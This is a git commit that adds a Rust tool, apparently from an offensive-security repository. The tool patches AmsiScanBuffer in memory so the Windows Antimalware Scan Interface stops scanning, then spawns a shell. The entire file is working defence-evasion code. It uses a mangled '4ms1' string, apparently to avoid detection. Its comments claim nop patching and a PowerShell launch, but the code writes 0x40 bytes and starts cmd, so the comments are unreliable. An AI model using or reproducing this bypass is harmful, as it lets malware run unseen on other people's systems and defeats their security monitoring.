0ed3f81d3f40a12bfe03c9ae002c2d843da162e1
Idov31 <ido.veltzman@gmail.com>
2022-02-02 18:19:47 +0200

    Add amsi bypass

---
+++ amsi_bypass/src/main.rs
@@ -0,0 +1,52 @@
+use std::{ffi::CString, ptr};
+use std::process::Command;
+
+use winapi::{
+    um::{
+    memoryapi::{
+        VirtualProtect,
+        WriteProcessMemory
+    },
+    libloaderapi::{
+        LoadLibraryA,
+        GetProcAddress
+    },
+    processthreadsapi::GetCurrentProcess, 
+    winnt::PAGE_READWRITE
+    }, 
+    shared::{
+        minwindef::{
+            DWORD, 
+            FALSE
+        },
+        ntdef::NULL
+    }
+};
+
+fn main() {
+    println!("[+] Patching 4ms1 for current process...");
+
+    unsafe {
+        // Getting the address of AmsiScanBuffer.
+        let patch = [0x40, 0x40, 0x40, 0x40, 0x40, 0x40];
+        let amsi_dll = LoadLibraryA(CString::new("amsi").unwrap().as_ptr());
+        let amsi_scan_addr = GetProcAddress(amsi_dll, CString::new("AmsiScanBuffer").unwrap().as_ptr());
+        let mut old_permissions: DWORD = 0;
+        
+        // Overwrite this address with nops.
+        if VirtualProtect(amsi_scan_addr.cast(), 6, PAGE_READWRITE, &mut old_permissions) == FALSE {
+            panic!("[-] Failed to change protection.");
+        }
+        let written: *mut usize = ptr::null_mut();
+
+        if WriteProcessMemory(GetCurrentProcess(), amsi_scan_addr.cast(), patch.as_ptr().cast(), 6, written) == FALSE {
+            panic!("[-] Failed to overwrite function.");
+        }
+        VirtualProtect(amsi_scan_addr.cast(), 6, old_permissions, &mut old_permissions);
+
+        // Spawn the new powershell.
+        println!("[+] AmsiScanBuffer patched!\n[*] Spawning powershell...");
+        let mut powershell = Command::new("cmd");
+        powershell.spawn();
+    }
+}
